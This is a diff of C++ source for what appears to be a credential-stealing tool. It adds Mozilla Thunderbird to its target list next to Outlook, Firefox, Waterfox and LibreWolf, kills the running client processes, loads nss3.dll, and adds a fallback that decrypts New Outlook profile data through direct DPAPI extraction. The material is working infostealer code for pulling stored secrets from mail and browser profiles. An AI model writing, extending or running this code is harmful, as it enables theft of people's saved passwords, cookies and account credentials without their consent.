@@ -58,8 +58,8 @@ int main() {
             "",
             {},
             "",
-            {L"Microsoft", L"Olk", L"EBWebView"},
-            "outlook_extract",
+            {L"Microsoft", L"Olk"},
+            "outlook",
             "outlook_tmp",
             false, false, false, false
         },
@@ -142,6 +142,16 @@ int main() {
             "librewolf_extract",
             "librewolf_tmp",
             false, true, false, true
+        },
+        {
+            "Mozilla Thunderbird",
+            "thunderbird.exe",
+            {L"C:\\Program Files\\Mozilla Thunderbird\\thunderbird.exe", L"C:\\Program Files (x86)\\Mozilla Thunderbird\\thunderbird.exe"},
+            "nss3.dll",
+            {L"Thunderbird", L"Profiles"},
+            "thunderbird_extract",
+            "thunderbird_tmp",
+            false, true, false, true
         }
     };
 
@@ -153,9 +163,16 @@ int main() {
     kill_processes_by_name("firefox.exe");
     kill_processes_by_name("waterfox.exe");
     kill_processes_by_name("librewolf.exe");
+    kill_processes_by_name("thunderbird.exe");
 
     for (const auto& config : configs) {
         std::wstring user_data_dir = get_user_data_dir(config.user_data_subdir, config.use_roaming);
+
+        // Outlook fallback check
+        if (user_data_dir.empty() && config.name == "New Outlook") {
+             user_data_dir = get_user_data_dir({L"Microsoft", L"Olk", L"EBWebView"}, false);
+        }
+
         if (user_data_dir.empty()) {
             std::cout << "User data directory not found for " << config.name << ", skipping..." << std::endl;
             continue;
@@ -184,6 +201,11 @@ int main() {
                 extract_all_profiles_data(v10_key, config, user_data_dir);
                 should_debug = false;
             }
+        } else if (!config.has_abe) {
+            // For Outlook or other non-ABE, try extraction even if Local State key isn't found (might use direct DPAPI)
+            std::cout << "No Local State key found for " << config.name << ", attempting direct DPAPI extraction..." << std::endl;
+            extract_all_profiles_data({}, config, user_data_dir);
+            should_debug = false;
         }
 
         if (!should_debug && !config.has_abe) continue;
